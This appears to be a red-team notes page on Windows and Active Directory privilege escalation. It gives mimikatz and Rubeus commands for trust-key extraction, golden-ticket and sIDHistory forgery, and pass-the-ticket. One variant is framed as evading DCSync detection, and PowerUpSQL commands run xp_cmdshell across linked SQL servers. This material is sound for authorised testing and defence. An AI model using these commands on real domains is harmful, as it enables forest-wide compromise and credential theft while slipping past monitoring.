# Privilege Escalation

## Local Privilege Escalation
- Unquoted Service Paths
- Service Permissions

### Privilege Escalation in Active Directory

#### Kerberos Delegations
- [Kerberos Delegations](Kerberos_Delegation.md)

### Privilege Escalation across trust relationships (Within Forest)

#### Trust-key Abuse
Trust key can be extracted by any of below mimikatz command variants. By default, all trust keys within forest use RC4 encyption, so we have to use `/RC4` parameter when utilizing mimikatz to abuse trust keys.
- `lsadump::trust /patch` (In trust-key is required , marked as `Child Domain -> Parent Domain`)
- `lsadump::dcsync /user:<Child domain netbios name>\<Parent domain netbios name>$`
- `lsadump::lsa /patch`

#### sIDHistory Injection
The kerberos golden module is used to abuse the sIDHistory feature. The trust-key obtained from previous step will be required to sign the ticket and is passed to the parent domain. The below mimikatz command is to forge an inter-realm TGT. Using the forged TGT, TGS can be requested for parent domain DC. 
- `kerberos::golden /domain:<FQDN of current domain> /sid:<Current domain SID> /sids:<sIDHistory of Enterprise Admin group> /rc4:<trust key> /user:<impersonate user>
/service:krbtgt /target:<parent domain> /ticket:<path/to/ticket.kirbi>`
- `Rubeus.exe asktgs /ticket:<path/to/ticket.kirbi> /service:<service/parent DC FQDN> /dc:<Parent DC FQDN> /ptt`

#### Abuse of krbtgt hash of child-domain
Here we are forcefully setting Enterprise Admin's SID for current child domain. This TGT will have a SID history of Enterprise Admin's group which will allow access to forest root DC.
- `kerberos::golden /user:<impersonate user> /domain:<current domain FQDN> /sid:<current domain SID> /sids:<sIDHistory of Enterprise Admin group> /krbtgt:<current domain krbtgt hash> /ticket:<path\to\ticket.kirbi>` 

> DCSync attacks can be detected by identity protection solutions. To avoid such detections, we can do sIDHistory attacks in such a way that it looks like a child DC is syncing with parent DC. The below mimikatz command demonstrates the above comments.
`````powershell
> kerberos::golden /user:child-dc$ /domain:<child domain FQDN> /sid:<child domain SID> /groups:516 /sids:<parent domain SID-516>, S-1-5-9 /krbtgt:<child domain krbtgt hash> /ptt
> lsadump::dcsync /user:<parent domain\Administrator> /domain:<parent domain FQDN>
`````
Details of RIDs:
- `516` - Domain Controllers
- `S-1-5-9` - Enterprise Domain Controllers (to be used only when escalating to forest root)

### AD-CS Abuse

- [Privilege Escaltion abusing AD-CS](AD_CS.md#privilege-escalation-with-ad-cs-abuse)

### MS-SQL service abuse
- Domain users can be mapped to database roles. (Compromised users might have roles on SQL server)
- PowerUpSQL tool can be utilized SQL service enumeration and privilege escalation

#### MS-SQL service enumeration 
- SPN Scanning to find SQL servers (`Get-SQLInstanceDomain`)
- Connectivity test to the discovered SQL servers (`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded`)
- SQL servers information can be obtained by `Get-SQLServerinfo -Verbose` (We should only run this for accessible SQL servers only)
- SQL server link crawling allows to identify *Database Links* between multiple SQL servers, which are used for accesseing data from external sources . **Database links works across forest trusts**.
    - `Get-SQLServerLinkCrawl -Instance <available SQL server> -Verbose` would allow to perform a link crawl across SQL servers recursively.
    - `Get-SQLServerLinkCrawl -Instance <available SQL server> -Query "exec master..xp_cmdshell 'whoami'"` would allow to check for possible code execution across linked SQL servers.